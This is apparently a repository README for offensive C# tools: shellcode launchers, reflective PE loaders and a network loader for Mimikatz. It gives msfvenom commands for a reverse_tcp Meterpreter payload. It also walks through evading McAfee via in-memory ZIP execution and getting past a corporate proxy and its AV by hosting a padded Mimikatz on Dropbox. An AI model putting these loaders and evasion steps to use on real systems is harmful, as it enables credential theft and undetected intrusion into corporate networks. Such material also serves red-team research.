C# Scripts
============

Author: Arno0x0x - [@Arno0x0x](https://twitter.com/Arno0x0x)

This repository aims at publishing some of my C# scripts. Some are just forked/inspired from other scripts I found there and there, and I adapted to fit my needs or just to learn and improve.

Decrypt via brute force (bf), then load and execute, an xor encrypted shellcode
----------------

**bfDecryptShellcode.cs**

This script is a little dumb and probably not very useful PoC of a brute force decrypting of a multibyte XOR encrypted shellcode. Once the shellcode is decrypted, it is loaded into memory and executed.

To use it, you need two things:
  1. An multibyte XOR encrypted shellcode
  2. The MD5 hash of the decrypted payload which serves as a marker for knowing that the proper decryption key has been found

You can obtain both by using my [ShellcodeWrapper](https://github.com/Arno0x/ShellcodeWrapper) project and feed it with any **raw** metasploit payload.


Dynamically load and parse a .Net assembly
----------------

**parseAssembly.cs**

This console application will dynamically load a .Net assembly (exe or dll), either from a local file or downloaded from a URL, optionnaly base64 encoded. Once loaded, it will enumerate it's types, method and properties.
Examples:
`parseAssembly.exe myAssembly.dll`
or
`parseAssembly.exe http://some.site.com/myAssembly base64`


Playing with PE and Shellcode reflective injection
----------------
This is a collection of scripts adapted from Casey Smith's ([@subTee](https://twitter.com/subTee)) work on reflectively inject PE or shellcode into the calling process, from various sources.

**peloader.cs**

This scripts loads a base64 encoded **x64** PE file (*for example: Mimikatz or a Meterpreter*) into the process's memory and reflectively executes it. The PE is passed as a base64 string variable at the beginning of the file (yes, it's hardcoded).

You can generate this base64 encoded string from any file using the following \*nix command line:
```
root@kali:~# base64 -w 0 mimikatz.exe > mimikatz.b64
```

Compiling the script on a Windows machine requires the .Net framework (*installed by default on Windows 7 onwards*):
```
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /unsafe /out:peloader.exe peloader.cs
```

**shellcodelauncher.cs**

This script executes a shellcode into the process's memory and reflectively executes it. The shellcode is passed as an array of bytes in a variable. You can get the proper code for this array automatically generated for you with Metasloit's msfvenom utility. For example, to generate a reverse_tcp meterpreter shellcode:

```
root@kali:~# msfvenom -a x86_64 -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.52.130 LPORT=4444 -f csharp
```

Compiling the script on a Windows machine requires the .Net framework (*installed by default on Windows 7 onwards*):

```
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /unsafe /out:shellcodeLauncher.exe shellcodeLauncher.cs
```

**runfromzipinmemory.cs**

This script is heavily and shamefully based, inspired, derived from Casey Smith (@subTee) work on Netkatz.

I found out that the local antivirus (*McAfee*) on my corporate workstation is configured to *NOT* analyze the content of a ZIP file, probably on the assumption that whenever this content is to be read or executed it would normally first be extracted somewhere on the disk, and any bad stuff in it would get caught by the AV at that time.

What this script does is loading everything in memory and work only from there, also using reflection to execute a PE from the calling process memory.

So not only the AV doesn't bark at all, but from a forensic perspective, the only "visibly running process" looks perfectly innocent.

Compiling the script on a Windows machine requires the .Net framework (*installed by default on Windows 7 onwards*):
```
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /unsafe /reference:System.IO.Compression.dll /out:runfromzipinmemory.exe runfromzipinmemory.cs
```

You can then execute:
```
unfromzipinmemory.exe <zip_file> <exe_from_zip_file_to_be_executed>
```

**netPEloader.cs**

This script is heavily based and inspired from Casey Smith (@subTee) work on Netkatz.

Netkatz is a fantastic PoC of loading the latest mimikatz release from GitHub and execute if straight in memory. However, I faced three problems in my environment:

1. The connection to the internet has to be made through a corporate proxy requiring NTLM authentication (*Windows SSO is OK*)
2. The github page of Mimikatz is blocked by the corporate proxy due to website categorization
3. The mimikatz_trunked.zip file is being detected by the proxy AV (*yes, with SSL inspection turned on at the proxy level*)

So I modified the original netkatz script to address these 3 issues:

1. Added system proxy and default credentials support (*currently logged on Windows user*)
2. Hosting the PE on a non blocked web site, innocent looking like www.dropbox.com
3. As per making the PE undetectable by AV, we could go throuth various obfuscation methods like encrypting, specific encoding, but I like the simple technique of adding 65536 random garbage bytes at the beginning of the real x64 Mimikatz PE:
	- dd if=/dev/urandom of=garbage bs=65536 count=1
	- cat garbage mimikatz.exe > mimiHidden
	- Upload mimiHidden to dropbox and share it	

The URL from where to download the hidden PE is hardcoded in the script.

Compiling the script on a Windows machine requires the .Net framework (*installed by default on Windows 7 onwards*):
```
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /unsafe /out:netPEloader.exe netPEloader.cs
```